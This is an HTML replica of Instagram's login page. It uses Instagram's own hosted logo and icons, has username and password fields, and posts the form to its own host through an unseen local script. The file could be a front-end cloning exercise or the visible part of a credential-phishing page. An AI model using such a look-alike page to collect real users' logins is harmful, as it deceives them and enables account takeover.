<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <!-- Favicon and App Icons - These are complex to replicate exactly, using placeholders -->
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" type="image/png">
    <link rel="apple-touch-icon" href="https://static.cdninstagram.com/rsrc.php/v4/yR/r/lam-fZmwmvn.png">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yq/r/_7cAFFbc4Pr.png" alt="Instagram Logo" class="instagram-logo">
            
            <form id="loginForm" method="post">
                <div class="input-container">
                    <label class="input-label">
                        <span class="label-text">Phone number, username, or email</span>
                        <input 
                            aria-label="Phone number, username, or email" 
                            aria-required="true" 
                            autocapitalize="off" 
                            autocorrect="off" 
                            maxlength="75" 
                            class="input-field" 
                            type="text" 
                            name="username"
                            id="username"
                            required>
                    </label>
                    <div class="input-underline"></div>
                </div>
                
                <div class="input-container">
                    <label class="input-label">
                        <span class="label-text">Password</span>
                        <input 
                            aria-label="Password" 
                            aria-required="true" 
                            autocapitalize="off" 
                            autocorrect="off" 
                            class="input-field" 
                            type="password" 
                            name="password"
                            id="password"
                            required>
                    </label>
                    <div class="input-underline"></div>
                    <button type="button" class="show-password-btn">Show</button>
                </div>
                
                <button type="submit" class="login-button">Log in</button>
            </form>
            
            <div class="separator-container">
                <div class="separator-line"></div>
                <span class="separator-text">or</span>
                <div class="separator-line"></div>
            </div>
            
            <a href="/" class="login-with-facebook">
                <svg aria-hidden="true" fill="currentColor" height="20" role="img" viewBox="0 0 16 16" width="20" class="fb-icon">
                    <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"></path>
                </svg>
                Log in with Facebook
            </a>
            
            <a href="https://instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-container">
            Don't have an account? <a href="/" class="signup-link">Sign up</a>
        </div>
        
        <div class="app-download-section">
            Get the app.
            <div class="app-buttons">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D84B67628-0BDE-4B53-8FD6-A2661FA5B441%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&hl=en" target="_blank" rel="nofollow noopener noreferrer">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
                </a>
                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1032&hl=en" target="_blank" rel="nofollow noopener noreferrer">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
                </a>
            </div>
        </div>
        
        <footer class="footer-section">
            <div class="footer-links">
                <span>Meta</span>
                <a href="https://about.instagram.com/" rel="nofollow noopener noreferrer" target="_blank">About</a>
                <a href="https://about.instagram.com/blog/" rel="nofollow noopener noreferrer" target="_blank">Blog</a>
                <a href="https://about.instagram.com/about-us/careers" rel="nofollow noopener noreferrer" target="_blank">Jobs</a>
                <a href="https://help.instagram.com/" rel="nofollow noopener noreferrer" target="_blank">Help</a>
                <a href="https://developers.facebook.com/docs/instagram" rel="nofollow noopener noreferrer" target="_blank">API</a>
                <a href="/legal/privacy/?hl=en" rel="nofollow noopener noreferrer">Privacy</a>
                <a href="/legal/terms/?hl=en" rel="nofollow noopener noreferrer">Terms</a>
                <a href="/explore/locations/?hl=en" rel="nofollow noopener noreferrer">Locations</a>
                <a href="/web/lite/?hl=en">Instagram Lite</a>
                <a href="https://www.threads.com/" target="_blank">Threads</a>
                <a href="https://www.facebook.com/help/instagram/261704639352628?hl=en" rel="nofollow noopener noreferrer" target="_blank">Contact Uploading & Non-Users</a>
                <a href="/accounts/meta_verified/?entrypoint=web_footer&hl=en">Meta Verified</a>
            </div>
            <div class="copyright-notice">
                © 2023 Instagram from Meta
            </div>
        </footer>
    </div>

    <script src="script.js"></script>
</body>
</html>
